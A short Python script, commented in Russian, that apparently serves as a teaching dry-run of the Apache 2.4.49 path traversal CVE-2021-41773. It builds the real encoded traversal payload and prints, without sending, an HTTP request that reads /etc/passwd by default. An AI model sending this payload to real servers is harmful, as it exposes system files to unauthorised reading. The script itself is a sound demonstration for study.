#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PoC-эмуляция для CVE-2021-41773 (Apache 2.4.49 Path Traversal).

"""

import argparse


def build_request_path(target_file: str) -> str:
    """
    Формируем путь запроса.
    Это демонстрация принципа Path Traversal.
    """
    target_file = target_file.lstrip("/")
    payload_prefix = "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e"
    return f"/{payload_prefix}/{target_file}"


def build_raw_http_request(path: str, host: str = "localhost") -> str:
    """
    Запрос
    """
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: PoC-Emulation/1.0\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PoC-эмуляция CVE-2021-41773 (без отправки запросов)"
    )
    parser.add_argument(
        "--target",
        default="/etc/passwd",
        help="Целевой файл (для демонстрации). По умолчанию: /etc/passwd",
    )
    parser.add_argument(
        "--host",
        default="localhost",
        help="Значение Host в заголовке HTTP (для эмуляции). По умолчанию: localhost",
    )
    args = parser.parse_args()

    path = build_request_path(args.target)
    raw_request = build_raw_http_request(path, host=args.host)

    print("[*] PoC-эмуляция CVE-2021-41773 (Apache 2.4.49 Path Traversal)")
    print("[*] Сформирован payload (подозрительный путь запроса):")
    print(f"    {path}")
    print()
    print("[!] Потенциальная атака: попытка Path Traversal (обход пути) для чтения файла.")
    print("[*] Эмуляция взаимодействия: сформирован пример HTTP-запроса (НЕ отправляется):")
    print("----- BEGIN REQUEST -----")
    print(raw_request, end="")
    print("----- END REQUEST -----")
    print()
    print("[DRY-RUN] Запрос не отправлялся. Уязвимость не проверялась на реальном сервере (учебная эмуляция).")


if __name__ == "__main__":
    main()
